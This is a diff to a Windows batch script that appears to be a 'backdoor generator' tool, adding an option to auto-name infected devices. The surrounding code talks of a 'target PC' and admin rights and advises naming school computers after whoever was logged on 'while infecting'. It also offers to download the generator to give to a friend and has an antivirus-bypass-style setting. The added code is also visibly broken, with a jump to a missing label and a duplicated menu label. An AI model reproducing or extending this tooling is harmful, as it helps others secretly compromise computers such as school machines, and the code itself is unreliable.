@@ -11,7 +11,7 @@ ECHO Set WshShell = WScript.CreateObject("WScript.Shell") >>"%TempVBSFile%"
 ECHO Wscript.Sleep 900                                    >>"%TempVBSFile%"
 ECHO WshShell.SendKeys "{F11}"                            >>"%TempVBSFile%"
 ECHO Wscript.Sleep 900                                    >>"%TempVBSFile%"
-set temp=0&set autofullscreen=true&set updatelogs=true&set debug_enabled=false&set antivirus=true&set progress_bar=true&set payload_is_exist=0&set cmd_is_exist=0&set control_is_exist=0&color 0F&set reg_value_exists=0&set target_software_bypass=false&set EP_install_launched_from_menu=false&set device_name_advice=true
+set temp=0&set autofullscreen=true&set updatelogs=true&set debug_enabled=false&set antivirus=true&set progress_bar=true&set payload_is_exist=0&set cmd_is_exist=0&set control_is_exist=0&color 0F&set reg_value_exists=0&set target_software_bypass=false&set EP_install_launched_from_menu=false&set device_name_advice=true&set auto_gen_name=false
 if not exist C:\ProgramData\autofullscreen.sav echo true>C:\ProgramData\autofullscreen.sav
 if not exist C:\ProgramData\updatelogs.sav echo true>C:\ProgramData\updatelogs.sav
 if not exist C:\ProgramData\debug_enabled.sav echo false>C:\ProgramData\debug_enabled.sav
@@ -19,6 +19,7 @@ if not exist C:\ProgramData\antivirus.sav echo true>C:\ProgramData\antivirus.sav
 if not exist C:\ProgramData\progress_bar.sav echo true>C:\ProgramData\progress_bar.sav
 if not exist C:\ProgramData\target_software_bypass.sav echo true>C:\ProgramData\target_software_bypass.sav
 if not exist C:\ProgramData\device_name_advice.sav echo true>C:\ProgramData\device_name_advice.sav
+if not exist C:\ProgramData\auto_gen_name.sav echo false>C:\ProgramData\auto_gen_name.sav
 title Beta Release %update_number%
 cls
 < C:\ProgramData\autofullscreen.sav (
@@ -41,6 +42,9 @@ cls
 )
 < C:\ProgramData\device_name_advice.sav (
   set /p device_name_advice=
+)
+< C:\ProgramData\auto_gen_name.sav (
+  set /p auto_gen_name=
 )
 if %autofullscreen% equ true CSCRIPT //nologo "%TempVBSFile%"
 if %username% equ 61481 goto skip_dev
@@ -75,6 +79,7 @@ if %username% equ kiran if not exist C:\users\%username%\EPbot_installed.sav got
   choice /C YNM /m "does target PC have admin rights? Y/N:
   if %errorlevel% equ 1 (set target_admin_rights=true) else (if %errorlevel% equ 2 (set target_admin_rights=false) else (goto menu))
   echo.
+  if %auto_gen_name% equ true goto gen_name
   if %device_name_advice% equ true (  
   echo it is recomended for school computers to use this format: username_roomID_assetnumber
   echo username is the username of whoever was logged on while infecting
@@ -86,6 +91,7 @@ if %username% equ kiran if not exist C:\users\%username%\EPbot_installed.sav got
   echo DO NOT USE SPACES, replace them with _ or -
   echo.
   set /p opt1=Device name:
+  :namegennxt
   echo where would you like to create the files
   echo if directory does not exist it will be created
   set /p opt2=directory:
@@ -295,6 +301,8 @@ echo.
 echo press any key to exit...
 pause >nul
 exit /b
+set opt1=%username%_device_%random%%random%
+goto namegennxt
 :UPcreate
 echo %update_number% >C:\ProgramData\UPnum.sav
 goto UPlogs
@@ -407,9 +415,10 @@ echo 6(legacy mode, old software bypass mode (broken) (%target_software_bypass%)
 echo 7(advice on proper device naming (%device_name_advice%)
 echo 8(download free installer (downloads an installer for the free version of the backdoor generator to give to a friend.)
 echo 9(download EP bot
-echo A(back to main menu
+echo A(automaticaly generate device name, format will be "%username%_device_[random number]" (%auto_gen_name%)
+echo B(back to main menu
 echo.
-choice /M "option: " /c 123456789A /n
+choice /M "option: " /c 123456789AB /n
 if %errorlevel% equ 1 goto menu1
 if %errorlevel% equ 2 goto menu2
 if %errorlevel% equ 3 goto menu3
@@ -419,7 +428,8 @@ if %errorlevel% equ 6 goto menu6
 if %errorlevel% equ 7 goto menu7
 if %errorlevel% equ 8 goto menu8
 if %errorlevel% equ 9 goto menu9
-if %errorlevel% equ 10 goto exit_menu
+if %errorlevel% equ 10 goto menu10
+if %errorlevel% equ 11 goto exit_menu
 :menunxt
 echo %autofullscreen%>C:\ProgramData\autofullscreen.sav
 echo %updatelogs%>C:\ProgramData\updatelogs.sav
@@ -428,6 +438,7 @@ echo %antivirus%>C:\ProgramData\antivirus.sav
 echo %progress_bar%>C:\ProgramData\progress_bar.sav
 echo %target_software_bypass%>C:\ProgramData\target_software_bypass.sav
 echo %device_name_advice%>C:\ProgramData\device_name_advice.sav
+echo %auto_gen_name%>C:\ProgramData\auto_gen_name.sav
 goto menu
 :menu1
 if %autofullscreen% equ false (set autofullscreen=true
@@ -471,3 +482,8 @@ goto menunxt
 :menu9
 set EP_install_launched_from_menu=true
 goto menu_install
+:menu7
+if %auto_gen_name% equ false (set auto_gen_name=true
+goto menunxt)
+if %auto_gen_name% equ true set auto_gen_name=false
+goto menunxt
